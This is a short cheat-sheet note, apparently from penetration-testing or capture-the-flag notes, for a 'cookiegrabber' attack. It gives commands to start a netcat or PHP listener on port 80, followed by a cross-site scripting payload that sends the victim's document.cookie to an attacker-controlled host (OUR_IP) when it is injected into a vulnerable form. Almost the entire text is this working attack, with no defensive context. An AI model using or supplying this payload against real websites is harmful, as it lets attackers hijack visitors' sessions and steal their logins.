# For **cookiegrabber**:
Started a **nc** listener or php:
`sudo nc -lvnp 80`
`sudo php -S 0.0.0.0:80`

Then any form that you have found the vulnerability in the website load the following pay load:
`<script>new Image().src='http://OUR_IP/cookiegrabbe.php?c='+document.cookie</script>`



